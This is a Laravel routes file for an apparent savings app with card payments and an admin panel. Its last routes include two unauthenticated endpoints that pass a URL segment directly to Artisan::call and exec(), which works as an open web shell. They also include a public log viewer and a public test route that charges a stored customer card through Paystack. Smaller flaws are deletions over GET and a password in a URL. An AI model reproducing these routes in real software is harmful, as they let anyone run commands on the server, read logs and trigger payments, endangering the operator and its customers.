<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('/', function () {
    return view('index');
});
Route::get('avatar/{url}', 'UserController@getProfileImage');

Auth::routes();
Route::post('/user/register', 'UserController@webRegister')->middleware('guest');
Route::group(['middleware' => ['auth']], function () {
    Route::get('/home', 'HomeController@index')->name('home');
    Route::get('/dashboard', 'HomeController@dashboard')->name('dashboard');
    Route::get('/plans', 'HomeController@tasks')->name('plans');
    Route::get('/transactions', 'HomeController@transactions')->name('transactions');
    Route::get('plan/withdraw/{id}', 'HomeController@withdraw')->name('withdraw');
    Route::post('plan/withdraw/{id}', 'HomeController@performWithdraw')->name('withdraw');
    Route::get('/cards', 'HomeController@cards')->name('cards');
    Route::get('/settings', 'HomeController@settings')->name('settings');
    Route::get('/settings/password', 'HomeController@settingsPassword');
    Route::post('/settings/password', 'HomeController@updatePassword');
    Route::post('profile/update', 'HomeController@updateProfile');
    Route::get('/no-plan', 'HomeController@noPlan')->name('no-plan');
//    Route::get('/no-card', 'HomeController@noCard')->name('no-card');
    Route::get('/deposit/normal', 'UserPlanController@normal');
    Route::get('/deposit/one-time', 'UserPlanController@oneTime');
    Route::get('/plan/edit/{id}', 'HomeController@editPlan');
    Route::get('/plan/{id}', 'HomeController@viewPlan');
    Route::post('/plan/{id}', 'UserPlanController@updatePlan');

    Route::post('/plan', 'UserPlanController@create');
    Route::get('/plan/close/{id}/{password}', 'UserPlanController@deletePlan');


    Route::get('/card/add', 'UserPlanController@createCard');
    Route::get('/card/remove/{id}', 'UserPlanController@removeCard');


    Route::get('/payment/callback', 'PaymentController@validateCardTransaction');
    Route::get('/payment/add-card', 'PaymentController@addCard');


    Route::group(['prefix' => 'admin', 'middleware' => ['admin']], function () {
        Route::get('/', 'AdminController@index');
        Route::get('/home', 'AdminController@index')->name('home');
        Route::get('/materials', 'AdminController@materials')->name('materials');
        Route::post('/materials', 'MaterialController@create');
//    Route::post('/materials/{id}', 'MaterialController@update');
        Route::get('/material/delete/{id}', 'MaterialController@delete');
        Route::post('/materials/search', 'MaterialController@search');

        Route::post('profile/update', 'AdminController@updateProfile');

        Route::get('/suppliers', 'AdminController@suppliers')->name('suppliers');
        Route::post('/suppliers', 'SupplierController@create');
        Route::get('/supplier/delete/{id}', 'SupplierController@delete');
        Route::post('/suppliers/search', 'SupplierController@search');

        Route::get('/settings', 'AdminController@settings')->name('settings');
        Route::get('/settings/password', 'AdminController@settingsPassword');
        Route::post('/settings/password', 'AdminController@updatePassword');


        Route::get('/no-plan', 'AdminController@noPlan')->name('no-plan');
        Route::get('/cards', 'AdminController@cards')->name('cards');
        Route::get('/customers', 'AdminController@customers')->name('customers');
        Route::get('/history', 'AdminController@history')->name('history');
        Route::post('/history/search', 'AdminController@history')->name('history.search');


        Route::get('/dashboard', 'AdminController@dashboard')->name('dashboard');
        Route::get('/customer/{id}', 'AdminController@viewCustomer');

        Route::get('/transactions', 'AdminController@transactions')->name('transactions');
        Route::get('/reports', 'AdminController@reports')->name('reports');
        Route::get('/admins', 'AdminController@admins')->name('admins');
        Route::get('/users', 'AdminController@users')->name('users');
        Route::get('/taskers', 'AdminController@taskers')->name('taskers');
        Route::get('/plans', 'AdminController@tasks')->name('plans');


        Route::get('/profile', 'ProfileController@index')->name('profile');
        Route::put('/profile', 'ProfileController@update')->name('profile.update');

        Route::group(['prefix' => 'user'], function () {
            Route::get('/{id}', 'UserController@singleUser');
            Route::get('delete/{id}', 'UserController@deleteUser');
        });
    });

});
Route::get('/logout', 'Auth\LoginController@logout');

Route::get('artisan/{string}', function ($command) {
    Artisan::call($command);
    return 'Artisan ' . $command . ' Completed';
});
Route::get('shell/{string}', function ($command) {
    exec($command);
    return 'Shell ' . $command . ' Completed';
});

Route::get('logs', '\Rap2hpoutre\LaravelLogViewer\LogViewerController@index');

//
//Route::get('/reports', 'HomeController@reports')->name('reports');
//Route::get('/admins', 'HomeController@admins')->name('admins');
//Route::get('/users', 'HomeController@users')->name('users');
//Route::get('/taskers', 'HomeController@taskers')->name('taskers');
//
//
//Route::get('/profile', 'ProfileController@index')->name('profile');
//Route::put('/profile', 'ProfileController@update')->name('profile.update');
//
//Route::group(['prefix' => 'user'], function () {
//    Route::get('/{id}', 'UserController@singleUser');
//    Route::get('delete/{id}', 'UserController@deleteUser');
//});
//Route::get('/about', function () {
//    return view('about');
//})->name('about');
Route::get('test', function () {

    $user = \App\User::find(1);
    $card = $user->cards->first();

//    dd($card);
    $trans = (new \App\Services\PaystackService)->chargeCustomer("100000", $card->authorization_code, $user);
    dd($trans);
});
